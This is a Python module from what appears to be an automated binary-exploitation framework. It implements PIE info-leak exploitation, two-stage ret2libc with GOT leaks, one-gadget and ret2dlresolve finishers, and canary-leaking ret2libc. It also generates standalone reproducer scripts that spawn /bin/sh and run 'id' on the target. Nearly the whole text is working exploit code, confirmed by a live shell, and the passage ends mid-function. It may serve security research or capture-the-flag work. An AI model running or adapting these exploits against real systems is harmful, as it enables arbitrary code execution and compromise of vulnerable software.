"""PIE exploitation via a runtime info-leak (Phase 9 frontier, analyst-in-the-loop).

A PIE binary loads at a randomized base, so static addresses are useless until a runtime
**info-leak** reveals a real address. This drives the target interactively in ONE process
(defeating live ASLR): read the leaked address from its output, compute the load base, send a
payload whose addresses are relocated to that base, and verify the exploit by an observable
success marker. The analyst supplies what the target leaks and how success shows (doc 15).
"""
from __future__ import annotations

import os
import re
import select
import struct
import subprocess
import time
from pathlib import Path

from ..dynamic import sandbox


def _kill(p):
    # Close the pipes FIRST so a half-filled stdin BufferedWriter does not raise an *unraisable*
    # BrokenPipeError when it is later GC'd and tries to flush to a process we just killed (a target
    # that exits mid-leak makes this the common case; pytest turns the unraisable into a warning).
    for stream in (getattr(p, "stdin", None), getattr(p, "stdout", None)):
        try:
            if stream is not None:
                stream.close()
        except Exception:                                    # noqa: BLE001
            pass
    try:
        os.killpg(os.getpgid(p.pid), 9)
    except OSError:
        try:
            p.kill()
        except OSError:
            pass


def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                     payload_for_base, success_regex: str, timeout: float = 8.0,
                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"") -> dict:
    """Interactive single-process leak → relocate → exploit over stdin/stdout.

    Two ways to turn the leak into an image base:
      - `leak_base_offset` (analyst-gated): the static offset of the single symbol the target
        leaks, so base = leaked - leak_base_offset.
      - `base_from_leaks` (automatic): a callback given EVERY hex value in the leak burst that
        returns the recovered base (e.g. `exploit.recover_pie_base` bound to the target bytes),
        so the analyst need not say which symbol is leaked.
    `payload_for_base(base)->bytes` builds the relocated payload. Success = `success_regex`
    appears in the post-payload output.
    """
    if leak_base_offset is None and base_from_leaks is None:
        raise ValueError("leak_and_exploit needs exactly one of leak_base_offset= "
                         "or base_from_leaks= (got neither)")
    rx = re.compile(leak_regex.encode("latin-1"))
    ok = re.compile(success_regex.encode("latin-1"))
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
    # The leak harness reads only the target's stdout, so it needs no control channel: contain
    # it fully (read-only fs, tmpfs, private pid + network namespace) when bwrap is available.
    exedir = str(Path(exe).resolve().parent)
    cmd = sandbox.isolate_prefix(exedir, net=False) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    if leak_trigger:                             # a format-string leak must be PROVOKED: send the
        try:                                     # %p dump first, then read the pointers it prints
            p.stdin.write(leak_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

    def _vals(b):
        out = []
        for m in rx.finditer(b):
            grp = m.group(1) if m.groups() else m.group(0)
            try:
                out.append(int(grp, 16))
            except ValueError:
                pass
        # Auto base recovery also consumes a RAW over-read: a write(fd,buf,BIG)/puts spills stack
        # memory as binary words (no hex text), which the regex never sees. recover_pie_base /
        # recover_libc_base corroborate across these, so harvest them alongside the hex.
        if base_from_leaks is not None:
            out += _le_pointer_words(b)
        return out

    deadline = time.time() + timeout
    buf = b""
    leaked = None
    last_data = time.time()
    try:
        while time.time() < deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                buf += chunk
                last_data = time.time()
                # a hex match, or (auto mode) a raw over-read word, means the burst has started
                if rx.search(buf) or (base_from_leaks is not None and _le_pointer_words(buf)):
                    leaked = True
                    # a format-string leak prints its whole burst at once, then the target
                    # blocks on our payload read (no EOF, no exit) -- so once something matched,
                    # stop after a brief quiet gap rather than spinning to the deadline.
                    if base_from_leaks is None:
                        break
            elif p.poll() is not None:
                break
            elif leaked and (time.time() - last_data) > 0.3:
                break                                    # burst captured; target now awaits input
        vals = _vals(buf)
        if not vals:
            _kill(p)
            return {"ok": False, "reason": "no leak matched before the target read input",
                    "output": buf[:400].decode("latin-1", "ignore")}

        if base_from_leaks is not None:
            base = base_from_leaks(vals)
            if not base:
                _kill(p)
                return {"ok": False, "reason": "could not recover the image base from the leak",
                        "leaked": vals[:8], "output": buf[:400].decode("latin-1", "ignore")}
        else:
            base = vals[0] - leak_base_offset
        leaked = base + leak_base_offset if base_from_leaks is None else vals[0]
        payload = payload_for_base(base)
        sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
        try:
            p.stdin.write(payload)
            p.stdin.flush()
            p.stdin.close()
        except (BrokenPipeError, OSError):
            pass

        out = buf
        # A FRESH budget for the confirmation read: the leak may have arrived just before `deadline`,
        # which would otherwise leave this loop zero iterations and miss a genuine success marker.
        post_deadline = time.time() + timeout
        while time.time() < post_deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                out += chunk
            elif p.poll() is not None:
                break
        # Search ONLY the post-payload bytes: a success_regex that merely appears in the target's
        # normal startup/leak output (pre-payload) must not declare a false "demonstrated".
        return {"ok": True, "leaked": leaked, "base": base,
                "success": bool(ok.search(out[sent_at:])),
                "output": out[:800].decode("latin-1", "ignore")}
    finally:
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:
            pass


def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> bytes:
    """A self-contained, stdlib-based reproducer: leak -> compute base -> ret2win. This is the
    portable PoC for a PIE target (the raw payload is base-specific and cannot be static)."""
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 PIE exploit (leak -> ret2win). Authorized-use only.\n"
        "import re, struct, subprocess, sys\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './poc/target.bin'\n"
        f"LEAK_RE = {leak_regex!r}\n"
        f"LEAK_OFF = {leak_base_offset:#x}   # static offset of the leaked symbol\n"
        f"WIN_OFF  = {off_win:#x}            # static offset of the win function\n"
        f"OFFSET   = {offset}                # overflow offset to saved return address\n"
        "def cyclic(n):\n"
        "    a=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
        "    out=bytearray(); i=0\n"
        "    while len(out)<n:\n"
        "        out+=bytes([a[i%len(a)]]); i+=1\n"
        "    return bytes(out[:n])\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n"
        "leaked=None\n"
        "for line in p.stdout:                       # read whole lines: the address is complete\n"
        "    m=re.search(LEAK_RE.encode(),line)\n"
        "    if m: leaked=int((m.group(1) if m.groups() else m.group(0)),16); break\n"
        "if leaked is None:\n"
        "    sys.stderr.write('no leak captured\\n'); sys.exit(1)\n"
        "base=leaked-LEAK_OFF\n"
        "print('leaked %#x -> base %#x -> win %#x'%(leaked,base,base+WIN_OFF))\n"
        "p.stdin.write(cyclic(OFFSET)+struct.pack('<Q',base+WIN_OFF)+b'C'*8)\n"
        "p.stdin.close()\n"
        "print(p.stdout.read().decode('latin-1','ignore'))\n"
    ).encode()


def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, puts_plt, puts_got,
                          ret_to, puts_off, system_off, binsh_off, ret_gadget=None, loop_feed=None,
                          canary_regex=r"0x[0-9a-fA-F]+", canary_index=None) -> bytes:
    """A self-contained, stdlib-based reproducer for a ret2libc PAST A STACK CANARY (no-PIE). The
    canary is per-process random, so a static input cannot exist -- the script LEAKS it at runtime,
    writes it back, does a two-stage puts leak to defeat ASLR, then system("/bin/sh"). All binary
    offsets are static (no-PIE); the libc base is recovered live, so the script is portable."""
    feed = loop_feed if loop_feed is not None else canary_trigger
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: ret2libc past a stack canary. Authorized-use only.\n"
        "import os, re, select, struct, subprocess, sys, time\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
        f"CANARY_OFF={canary_offset}; RET_OFF={ret_offset}\n"
        f"TRIGGER={canary_trigger!r}; FEED={feed!r}\n"
        f"POP_RDI={pop_rdi:#x}; PUTS_PLT={puts_plt:#x}; PUTS_GOT={puts_got:#x}; RET_TO={ret_to:#x}\n"
        f"PUTS_OFF={puts_off:#x}; SYSTEM_OFF={system_off:#x}; BINSH_OFF={binsh_off:#x}\n"
        f"RET_GADGET={ret_gadget if ret_gadget else 0:#x}; REGEX={canary_regex!r}; "
        f"IDX={canary_index if canary_index is not None else 'None'}\n"
        "def q(v): return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "def read_until(p, deadline, quiet=0.3):\n"
        "    out=b''; last=time.time()\n"
        "    while time.time()<deadline:\n"
        "        r,_,_=select.select([p.stdout],[],[],0.1)\n"
        "        if r:\n"
        "            c=os.read(p.stdout.fileno(),4096)\n"
        "            if not c: break\n"
        "            out+=c; last=time.time()\n"
        "        elif p.poll() is not None: break\n"
        "        elif out and (time.time()-last)>quiet: break\n"
        "    return out\n"
        "def find_canary(vals):\n"
        "    for v in vals:\n"
        "        if v&0xFF or v>>8==0 or v<0x1000000000000: continue\n"
        "        if 0x550000000000<=v<=0x5FFFFFFFFFFF or 0x7F0000000000<=v<=0x7FFFFFFFFFFF: continue\n"
        "        return v\n"
        "    return None\n"
        "def prefix(c): return b'A'*CANARY_OFF + q(c) + b'B'*max(0, RET_OFF-CANARY_OFF-8)\n"
        "for align in ((None, RET_GADGET) if RET_GADGET else (None,)):\n"
        "  for _ in range(3):\n"
        "    p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "    read_until(p, time.time()+0.5)\n"
        "    p.stdin.write(TRIGGER); p.stdin.flush()\n"
        "    dump=read_until(p, time.time()+3)\n"
        "    vals=[int(m.group(0),16) for m in re.finditer(REGEX.encode(),dump)]\n"
        "    canary = vals[IDX] if (IDX is not None and -len(vals)<=IDX<len(vals)) else find_canary(vals)\n"
        "    if canary is None: p.kill(); continue\n"
        "    pre=prefix(canary)\n"
        "    p.stdin.write(pre+q(POP_RDI)+q(PUTS_GOT)+q(PUTS_PLT)+q(RET_TO)); p.stdin.flush()\n"
        "    burst=read_until(p, time.time()+3); raw=burst.split(b'\\n',1)[0][:6]\n"
        "    if len(raw)<6: p.kill(); continue\n"
        "    base=int.from_bytes(raw.ljust(8,b'\\x00'),'little')-PUTS_OFF\n"
        "    if base<=0 or base&0xFFF: p.kill(); continue\n"
        "    p.stdin.write(FEED); p.stdin.flush(); read_until(p, time.time()+0.4)\n"
        "    s2=bytearray(pre)+(q(align) if align else b'')+q(POP_RDI)+q(base+BINSH_OFF)+q(base+SYSTEM_OFF)\n"
        "    try:\n"
        "        p.stdin.write(bytes(s2)); p.stdin.flush(); time.sleep(0.3)\n"
        "        p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
        "    except (BrokenPipeError, OSError): p.kill(); continue\n"
        "    out=read_until(p, time.time()+6, quiet=1.5)\n"
        "    if b'PWNED-LYKOS' in out:\n"
        "        print('shell (canary %#x, libc base %#x):'%(canary,base)); print(out.decode('latin-1','ignore')); sys.exit(0)\n"
        "    p.kill()\n"
        "sys.stderr.write('canary ret2libc did not confirm\\n'); sys.exit(1)\n"
    ).encode()


# --- ret2libc WITH a runtime puts() leak -------------------------------------------------------
def _read_until(p, deadline, quiet=0.3):
    """Read a target's merged stdout until it stalls (a quiet gap) or exits; returns the bytes."""
    out, last = b"", time.time()
    while time.time() < deadline:
        r, _, _ = select.select([p.stdout], [], [], 0.1)
        if r:
            chunk = os.read(p.stdout.fileno(), 4096)
            if not chunk:
                break
            out += chunk
            last = time.time()
        elif p.poll() is not None:
            break
        elif out and (time.time() - last) > quiet:
            break
    return out


def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                  puts_off, system_off, binsh_off, ret_gadget=None, one_gadgets=(),
                  base_argv=(), marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
                  mem_mb: int = 2048, leaker: str = "puts", pop_rsi=None, pop_rdx=None,
                  write_plt=None) -> dict:
    """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.

    Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
    little-endian bytes, then returns to `ret_to` so the loop reads again. `resolve_libc_base`
    subtracts the symbol's offset to recover the libc base; stage 2 then re-triggers the overflow
    with a FINISHER that spawns a shell from the recovered base -- tried best-first:

      * `ret2libc`   -- `system("/bin/sh")` (a pop-rdi chain). Needs a 16-byte-aligned rsp, and the
                        re-entered frame's parity is environment-dependent, so it is tried with and
                        without a `ret` pad on a fresh process each.
      * `one_gadget` -- a single libc address that `execve("/bin/sh", ...)` in one jump (from
                        `rop.find_one_gadgets`). No argument setup, so it wins exactly the cases
                        system() cannot: a bad stack parity, or a constraint the pop chain can't meet.

    `one_gadgets` are libc OFFSETS (relocated to base+offset at runtime). Success = the spawned
    shell EVALUATES the forgery-proof marker, which a crash, a wrong address, or a reflected input
    can never produce. Returns {ok, base, leaked, align, technique, ...}.
    """
    from . import attribution, rop
    # Forgery-proof confirmation: a bare `echo <marker>` is reflected verbatim by a target that
    # merely echoes stdin (no shell), so `marker in out` false-positives. The code markers embed
    # arithmetic + quote-stripping that ONLY a real shell resolves; an echo emits the raw form.
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last_leaked = None

    def _sys_finisher(base, align):                      # system("/bin/sh")
        return rop.build_ret2system(offset, pop_rdi, base + binsh_off, base + system_off, 0,
                                    ret_gadget=align)

    def _one_gadget_finisher(og):                        # jump to base+og: execve("/bin/sh") in one
        def build(base, align):
            pad = struct.pack("<Q", ret_gadget) if (align and ret_gadget) else b""
            return bytes(bytearray(b"A" * offset) + pad + struct.pack("<Q", base + og))
        return build

    finishers = []                                       # (technique, build(base, align), og|None)
    if system_off is not None and binsh_off is not None:
        finishers.append(("ret2libc", _sys_finisher, None))
    for _og in one_gadgets or ():
        finishers.append(("one_gadget", _one_gadget_finisher(_og), _og))

    for tech, build_s2, fog in finishers:
        # stage-2 alignment: even parity (no pad), then odd (one `ret`); one of the two is aligned.
        for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
            # A couple of tries per parity: the leak is one process, and a rare short read on stage
            # 1 is worth a retry before ruling the parity out.
            for _ in range(3):
                preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
                cmd = (sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir])
                       + [str(exe)] + argv)
                try:
                    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, cwd=exedir,
                                         start_new_session=True, preexec_fn=preexec)
                except Exception as e:                    # noqa: BLE001
                    return {"ok": False, "reason": f"spawn failed: {e!r}"}
                try:
                    _read_until(p, time.time() + 0.5)     # drain the target's first prompt/banner
                    # Stage-1 leaker. write(1, got, 8) is the ROBUST path (exact 8 raw bytes, no NUL
                    # or format truncation) when the target exposes write() + pop rsi/rdx; puts/printf
                    # print the pointer until its trailing NUL (6 bytes). `write_plt` carries the
                    # write stub in the write case, else `puts_plt` is the puts/printf stub.
                    if leaker == "write" and pop_rsi and pop_rdx and write_plt:
                        s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi,
                                                  pop_rdx=pop_rdx, got=puts_got, write_plt=write_plt,
                                                  ret_to=ret_to, ret_gadget=None)
                    else:
                        s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                                 puts_plt=puts_plt, ret_to=ret_to, ret_gadget=None)
                    try:
                        p.stdin.write(s1)
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    burst = _read_until(p, time.time() + timeout / 2)
                    if leaker == "write":
                        raw = burst[:8]                   # write() emits exactly 8 raw bytes
                    else:
                        raw = burst.split(b"\n", 1)[0][:6]  # puts/printf: pointer up to its NUL
                    if len(raw) < 6:
                        continue
                    leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
                    base = rop.resolve_libc_base(leaked, puts_off)
                    last_leaked = leaked
                    if not base:
                        continue                          # not the pointer we assumed; retry/parity
                    s2 = build_s2(base, align)
                    try:
                        p.stdin.write(s2)
                        p.stdin.flush()
                        time.sleep(0.3)
                        p.stdin.write(markers.command + b"\n")
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        break                             # stage 2 killed the process: wrong parity
                    # A spawned shell may echo after a gap under the sandbox, so wait out a longer
                    # quiet window before concluding the marker never came.
                    out = _read_until(p, time.time() + timeout, quiet=1.5)
                    if markers.proves(out):               # a shell EVALUATED it, not an echo
                        r = {"ok": True, "base": base, "leaked": leaked, "align": align,
                             "technique": tech, "output": out[:400].decode("latin-1", "ignore")}
                        if tech == "ret2libc":
                            r["system"], r["binsh"] = base + system_off, base + binsh_off
                        else:
                            r["one_gadget"] = base + fog
                        return r
                finally:
                    for stream in (p.stdin, p.stdout):    # close first: no buffered flush to a dead
                        try:                               # pipe raising an unraisable BrokenPipe
                            if stream is not None:
                                stream.close()
                        except Exception:                  # noqa: BLE001
                            pass
                    _kill(p)
                    try:
                        p.wait(timeout=2)
                    except Exception:                     # noqa: BLE001
                        pass
    return {"ok": False, "reason": "no shell confirmed (leak captured but no finisher spawned a "
                                   "shell under either stack alignment)", "leaked": last_leaked}


def pie_ret2libc_leak(exe, workdir, *, offset, leak_trigger, target_bytes, pop_rdi_off,
                      puts_plt_off, puts_got_off, ret_to_off, puts_libc_off, system_off, binsh_off,
                      ret_gadget_off=None, leaker="puts", pop_rsi_off=None, pop_rdx_off=None,
                      write_plt_off=None, one_gadget_offs=(), base_argv=(), timeout: float = 10.0,
                      mem_mb: int = 2048) -> dict:
    """PIE ret2libc defeating ASLR with TWO leaks in ONE process -- an honest defeat (it never
    assumes a fixed base).

      phase 0: a buffer OVER-READ (the `leak_trigger` fills the leak read) spills RETURN addresses;
               `recover_pie_base` pins the image base, and every binary address below is relocated
               by it. No format-string sink needed.
      stage 1: a base-relocated `puts(puts@GOT)` / `write(1, GOT, 8)` prints the libc address of the
               leaked symbol, then returns to `ret_to` (main) so the loop reads again.
      stage 2: `resolve_libc_base` -> `system("/bin/sh")` (or a one-gadget), after re-feeding the
               staging read the re-entered loop performs first.

    Every `*_off` binary address is an IMAGE offset (relocated by the recovered base); the libc
    `*_off` are offsets in the loading libc. Confirmed by a spawned shell that EVALUATES the
    forgery-proof marker (never an echo). system()'s rsp parity is environment-dependent, so both
    alignments are detonated on a fresh process each. Returns {ok, pie_base, libc_base, ...}."""
    from . import attribution, rop
    from .exploit import recover_pie_base
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    finishers = []                                       # (technique, one_gadget_off | None)
    if system_off is not None and binsh_off is not None:
        finishers.append(("ret2libc", None))
    finishers += [("one_gadget", og) for og in (one_gadget_offs or ())]
    aligns = [None, ret_gadget_off] if ret_gadget_off is not None else [None]
    last = {"ok": False, "reason": "no PIE base recovered from the over-read leak"}

    def _leak_base(p):
        try:
            p.stdin.write(leak_trigger); p.stdin.flush()
        except (BrokenPipeError, OSError):
            return None
        return recover_pie_base(_le_pointer_words(_read_until(p, time.time() + timeout / 2)),
                                target_bytes)

    for tech, fog in finishers:
        for align_off in aligns:
            for _ in range(2):                           # a short read on a stage is worth a retry
                preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
                cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
                try:
                    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                         preexec_fn=preexec)
                except Exception as e:                   # noqa: BLE001
                    return {"ok": False, "reason": f"spawn failed: {e!r}"}
                try:
                    _read_until(p, time.time() + 0.5)    # banner
                    base = _leak_base(p)                 # phase 0: recover the PIE image base
                    if not base:
                        continue
                    pop_rdi, ret_to, puts_got = base + pop_rdi_off, base + ret_to_off, base + puts_got_off
                    # stage 1: leak a libc pointer out of a GOT slot, return to the loop
                    if (leaker == "write" and pop_rsi_off is not None and pop_rdx_off is not None
                            and write_plt_off is not None):
                        s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=base + pop_rsi_off,
                                                  pop_rdx=base + pop_rdx_off, got=puts_got,
                                                  write_plt=base + write_plt_off, ret_to=ret_to,
                                                  ret_gadget=None)
                    else:
                        s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                                 puts_plt=base + puts_plt_off, ret_to=ret_to,
                                                 ret_gadget=None)
                    try:
                        p.stdin.write(s1); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    burst = _read_until(p, time.time() + timeout / 2)
                    raw = burst[:8] if leaker == "write" else burst.split(b"\n", 1)[0][:6]
                    if len(raw) < 6:
                        continue
                    leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
                    libc_base = rop.resolve_libc_base(leaked, puts_libc_off)
                    if not libc_base:
                        last = {"ok": False, "reason": "PIE base ok but libc leak unrecognised",
                                "pie_base": base, "leaked": leaked}
                        continue
                    # the loop re-enters: satisfy the staging (over-read) read, drain its echo
                    try:
                        p.stdin.write(leak_trigger); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    _read_until(p, time.time() + 0.4)
                    align = (base + align_off) if align_off is not None else None
                    if tech == "ret2libc":
                        s2 = rop.build_ret2system(offset, pop_rdi, libc_base + binsh_off,
                                                  libc_base + system_off, 0, ret_gadget=align)
                    else:
                        pad = struct.pack("<Q", align) if align else b""
                        s2 = bytes(bytearray(b"A" * offset) + pad
                                   + struct.pack("<Q", libc_base + fog))
                    try:
                        p.stdin.write(s2); p.stdin.flush()
                        time.sleep(0.3)
                        p.stdin.write(markers.command + b"\n"); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    out = _read_until(p, time.time() + timeout, quiet=1.5)
                    if markers.proves(out):
                        r = {"ok": True, "pie_base": base, "libc_base": libc_base, "technique": tech,
                             "align": align_off, "output": out[:400].decode("latin-1", "ignore")}
                        if tech == "ret2libc":
                            r["system"], r["binsh"] = libc_base + system_off, libc_base + binsh_off
                        else:
                            r["one_gadget"] = libc_base + fog
                        return r
                finally:
                    for stream in (p.stdin, p.stdout):
                        try:
                            if stream is not None:
                                stream.close()
                        except Exception:                # noqa: BLE001
                            pass
                    _kill(p)
                    try:
                        p.wait(timeout=2)
                    except Exception:                    # noqa: BLE001
                        pass
    return last


def ret2dlresolve(exe, workdir, *, offset, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
                  jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
                  base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """Leak-free ret2dlresolve, confirmed by a spawned shell. Forge an Elf64_Rela + Elf64_Sym +
    the "system" string in the target's own .bss, read them in with one read(0, scratch, n), then
    drop into PLT0 with the forged reloc index so the loader resolves `symbol` and calls it with
    rdi = &arg. No libc leak, no `system` PLT entry -- it works against whatever loader the target
    runs under (older offline glibc included), because everything forged is the target's own data.

    system()/do_system needs a 16-byte-aligned rsp and the re-entered frame's parity is
    environment-dependent, so BOTH parities are detonated on a fresh process each. Success = the
    spawned shell EVALUATES the forgery-proof marker. Returns {ok, align, ...}.
    """
    from . import attribution, rop
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    for align in (False, True):
        chain, fake = rop.build_ret2dlresolve(
            offset, read_plt=read_plt, plt0=plt0, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx,
            ret_gadget=ret_gadget, jmprel=jmprel, symtab=symtab, strtab=strtab, scratch=scratch,
            symbol=symbol, arg=arg, align=align)
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception as e:                           # noqa: BLE001
            return {"ok": False, "reason": f"spawn failed: {e!r}"}
        try:
            _read_until(p, time.time() + 0.5)            # drain the target's banner
            try:
                p.stdin.write(chain); p.stdin.flush()    # stage 1: overflow -> read(scratch) chain
                time.sleep(0.2)
                p.stdin.write(fake); p.stdin.flush()     # the forged structures the read consumes
                time.sleep(0.3)
            except (BrokenPipeError, OSError):
                continue                                 # crashed before the resolve -> try parity
            if p.poll() is None:
                try:
                    p.stdin.write(markers.command + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    pass
            out = _read_until(p, time.time() + timeout, quiet=1.5)
            if markers.proves(out):                      # a shell EVALUATED the challenge
                return {"ok": True, "align": align, "scratch": scratch, "reloc_symbol": symbol,
                        "output": out[:400].decode("latin-1", "ignore")}
        finally:
            for stream in (p.stdin, p.stdout):
                try:
                    if stream is not None:
                        stream.close()
                except Exception:                        # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                            # noqa: BLE001
                pass
    return {"ok": False, "reason": "no shell confirmed (ret2dlresolve did not spawn a shell under "
                                   "either stack alignment; is the target binding lazily?)"}


# --- analyst-assisted PIE ret2libc (pure-libc ROP; no pie_base needed) --------------------------
def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_sym=None,
                     leak_trigger: bytes = b"", leak_regex: str = r"0x[0-9a-fA-F]+",
                     leak_index=None, base_argv=(), marker: bytes = b"LYKOS-PIE-R2L-9931",
                     timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """PIE/ASLR ret2libc where the ANALYST makes the leak deterministic.

    A PIE target's own gadgets are unusable until pie_base is known, and recovering pie_base (or
    libc_base) generically from a `%p` dump is target/libc-specific (which slot, which symbol, a
    version-specific return offset). Instead the analyst supplies what they identified: a
    `leak_trigger` that discloses a LIBC pointer and either the symbol it points to (`leak_sym`)
    or its raw libc offset (`leak_offset`), so `libc_base = leaked - leak_offset`. The chain is then
    a PURE-LIBC ROP -- `pop rdi; ret` and the `ret` pad come from libc too -- so it never needs
    pie_base. `leak_regex` extracts hex pointers; `leak_index` picks which match (default: the first
    whose subtraction yields a page-aligned base). Success is a spawned shell echoing `marker`.
    """
    import re as _re
    import struct as _struct

    from . import attribution, rop
    markers = attribution.make_code_markers()            # forgery-proof: an echo can't fake a shell
    auto = leak_offset is None and not leak_sym          # no slot named -> auto-classify the dump
    if leak_offset is None and leak_sym:
        leak_offset = rop.libc_symbols(libc_data, (leak_sym,)).get(leak_sym)
        if leak_offset is None:
            return {"ok": False, "reason": f"leak_sym {leak_sym!r} not in libc .dynsym"}
    pop_rdi = rop.find_gadget(libc_data, "pop_rdi")
    ret_g = rop.find_gadget(libc_data, "ret")
    binsh = rop.find_string(libc_data, b"/bin/sh")
    system = rop.libc_symbols(libc_data, ("system",)).get("system")
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    # The redirect tail, tried in order. Preferred: pop-rdi; "/bin/sh"; system. Fallback: a libc
    # one-gadget (a single address that execve's "/bin/sh" when rsi/rdx are NULL) -- covers targets
    # whose libc lacks a clean pop-rdi/system pairing, and older glibc where one-gadgets are common.
    # An unusable gadget (its register constraint does not hold at the hijack) simply fails to spawn
    # a shell and the next tail is tried; the live-shell check never mints a false positive.
    tails = []
    if pop_rdi and binsh and system:
        tails.append(("system", lambda base, pad: ((q(base + ret_g) if ret_g else b"") if pad else b"")
                                                  + q(base + pop_rdi) + q(base + binsh) + q(base + system)))
    for g in rop.find_one_gadgets(libc_data)[:4]:
        og = g["offset"]
        tails.append((f"one_gadget@{hex(og)} [{g['constraint']}]",
                      lambda base, pad, o=og: ((q(base + ret_g) if ret_g else b"") if pad else b"")
                                              + q(base + o)))
    if not tails:
        return {"ok": False, "reason": "libc lacks a pop-rdi gadget / \"/bin/sh\" / system and has "
                                       "no usable one-gadget"}
    rx = _re.compile(leak_regex.encode("latin-1"))
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last = None
    for tail_name, tail_fn in tails:
      for pad in (0, 1):                                          # stage alignment: even, then odd
        for _ in range(2):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                if leak_trigger:
                    try:
                        p.stdin.write(leak_trigger)
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                burst = _read_until(p, time.time() + timeout / 2)
                vals = []
                for m in rx.finditer(burst):
                    try:
                        vals.append(int(m.group(0), 16))
                    except ValueError:
                        pass
                cands = [vals[leak_index]] if (leak_index is not None and
                                               -len(vals) <= leak_index < len(vals)) else vals
                base = None
                if auto:                                     # no slot named: recover from >=2 syms
                    base = rop.recover_libc_base(cands, libc_data)
                    if base:
                        last = base
                else:
                    for v in cands:
                        b = v - leak_offset
                        if b > 0 and b % 0x1000 == 0:            # a real libc base is page-aligned
                            base, last = b, b
                            break
                if base is None:
                    continue
